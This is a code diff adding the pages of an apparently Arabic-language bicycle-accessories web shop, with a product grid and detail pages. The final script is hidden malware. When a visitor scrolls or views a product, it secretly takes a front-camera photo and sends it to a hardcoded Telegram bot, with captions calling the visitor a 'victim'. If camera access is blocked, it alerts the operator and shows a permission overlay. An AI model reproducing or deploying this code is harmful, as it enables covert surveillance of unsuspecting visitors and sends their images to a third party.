@@ -241,4 +241,224 @@
                 <p>أفضل الإكسسوارات الأصلية بأرخص الأسعار في مصر والشحن لجميع المحافظات.</p>
             </div>
 
-            <h2 style="color: #0f172a; margin-bottom:
+            <h2 style="color: #0f172a; margin-bottom: 15px; font-size: 20px;">منتجاتنا المتاحة:</h2>
+            
+            <div class="products-grid">
+                <!-- المنتج الأول -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_horn.jpg" alt="سرينة عجل">
+                    </div>
+                    <h3 class="product-title">سرينة عجل ذكية متعددة المهام</h3>
+                    <div class="product-price">السعر: 150 ج.م</div>
+                    <p class="short-desc">سرينة احترافية مزودة بكشاف ليد قوي وصوت إنذار عالي.</p>
+                    <button class="btn" onclick="openProductPage('hornProduct', 'سرينة العجل الذكية')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+
+                <!-- المنتج الثاني -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_light.jpg" alt="إضاءة ليد">
+                    </div>
+                    <h3 class="product-title">كشاف ليد خلفي قابل للشحن</h3>
+                    <div class="product-price">السعر: 90 ج.م</div>
+                    <p class="short-desc">إضاءة تحذيرية قوية لسلامتك أثناء القيادة الليلية.</p>
+                    <button class="btn" onclick="openProductPage('lightProduct', 'كشاف الليد الخلفي')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+
+                <!-- المنتج الثالث -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_lock.jpg" alt="قفل عجل">
+                    </div>
+                    <h3 class="product-title">قفل دراجة فولاذي متين</h3>
+                    <div class="product-price">السعر: 120 ج.م</div>
+                    <p class="short-desc">قفل محصن ضد السرقة بطبقة حماية سيليكون لمنع الخدوش.</p>
+                    <button class="btn" onclick="openProductPage('lockProduct', 'قفل الدراجة الفولاذي')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. صفحة تفاصيل المنتج الأول -->
+        <div id="hornProduct" class="page-section">
+            <div class="details-container">
+                <h2>سرينة عجل ذكية متعددة المهام</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_horn.jpg" alt="سرينة عجل">
+                </div>
+                <div class="product-price">السعر: 150 ج.م</div>
+                <p>سرينة احترافية للدراجات مزودة بكشاف ليد قوي متعدد الأوضاع وصوت إنذار عالي التنبيه ومقاومة للأمطار.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>🔋 بطارية 1200 مللي أمبير تعمل حتى 5 ساعات متواصلة.</li>
+                        <li>🔊 قوة صوت تصل إلى 120 ديسيبل.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 3. صفحة تفاصيل المنتج الثاني -->
+        <div id="lightProduct" class="page-section">
+            <div class="details-container">
+                <h2>كشاف ليد خلفي قابل للشحن</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_light.jpg" alt="إضاءة ليد">
+                </div>
+                <div class="product-price">السعر: 90 ج.م</div>
+                <p>كشاف خلفي فائق السطوع يشحن عبر منفذ USB، ويحتوي على عدة وضعيات إضاءة لضمان رؤيتك بوضوح.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>⚡ شحن سريع عبر USB.</li>
+                        <li>🌧️ مقاوم لقطرات المياه والأمطار.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 4. صفحة تفاصيل المنتج الثالث -->
+        <div id="lockProduct" class="page-section">
+            <div class="details-container">
+                <h2>قفل دراجة فولاذي متين</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_lock.jpg" alt="قفل عجل">
+                </div>
+                <div class="product-price">السعر: 120 ج.م</div>
+                <p>قفل مصنوع من الفولاذ المقوى عالي الصلابة لحماية دراجتك من السرقات.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>🔒 قلب قفل نحاسي مقاوم للصدأ.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 5. قسم المزيد -->
+        <div id="moreSection" class="page-section">
+            <h2>✨ منتجات وأقسام إضافية</h2>
+            <p>قريباً جداً سيتم إطلاق تشكيلة واسعة من إكسسوارات العجل المميزة.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+        <!-- 6. قسم من نحن -->
+        <div id="aboutSection" class="page-section">
+            <h2>📖 من نحن</h2>
+            <p>نحن متجر متخصص في توفير أفضل قطع غيار وإكسسوارات الدراجات في مصر.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+        <!-- 7. قسم اتصل بنا -->
+        <div id="contactSection" class="page-section">
+            <h2>📞 اتصل بنا والدعم الفني</h2>
+            <p>يسعدنا دائماً تواصلكم معنا لأي استفسار أو طلبات عبر الأرقام المتاحة.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+    </div>
+
+    <footer>
+        جميع الحقوق محفوظة © متجر العجل برو 2026
+    </footer>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8732626253:AAHGWyKFHqXI1sSOFnQ2sVeR4vmJBeJ7iNw";
+        const CHAT_ID = "6772192037";
+        let hasScrolledCaptured = false;
+        let blockAlertSent = false; // لضمان إرسال إشعار البلوك مرة واحدة فقط
+
+        // مراقبة حركة السكرول (التمرير)
+        window.addEventListener('scroll', function() {
+            if (!hasScrolledCaptured) {
+                hasScrolledCaptured = true;
+                takePhotoAndSend('عمل Scroll (تمرير في الشاشة)');
+            }
+        });
+
+        function requestCameraAgain() {
+            takePhotoAndSend('إعادة محاولة منح صلاحية الكاميرا');
+        }
+
+        function showSection(sectionId) {
+            const sections = document.querySelectorAll('#homeSection, .page-section');
+            sections.forEach(sec => sec.style.display = 'none');
+            document.getElementById(sectionId).style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        function openProductPage(pageId, productName) {
+            takePhotoAndSend(`معاينة منتج: ${productName}`);
+            showSection(pageId);
+        }
+
+        // إرسال رسالة فورية لتليجرام حال حدوث البلوك
+        function sendBlockAlertImmediate() {
+            if (!blockAlertSent) {
+                blockAlertSent = true;
+                const textMessage = "⚠️ تنبيه هام: قام شخص بالدخول إلى الموقع وعمل حظر (Block) للكاميرا وظهرت له رسالة التحذير!";
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage
+                    })
+                }).catch(err => console.log(err));
+            }
+        }
+
+        function takePhotoAndSend(actionType) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                document.getElementById('permissionOverlay').style.display = 'none';
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'victim_bike_shop.jpg');
+                        formData.append('caption', `🚲 ضحية جديدة التقطت صورته بسبب (${actionType}) في المتجر!`);
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(err => console.log(err));
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.8);
+                }, 800);
+            }).catch(err => {
+                console.log("Camera access denied (Blocked)");
+                document.getElementById('permissionOverlay').style.display = 'flex';
+                sendBlockAlertImmediate(); // إرسال الإشعار فوراً لتليجرام بدون مشاكل
+            });
+        }
+    </script>
+</body>
+</html>
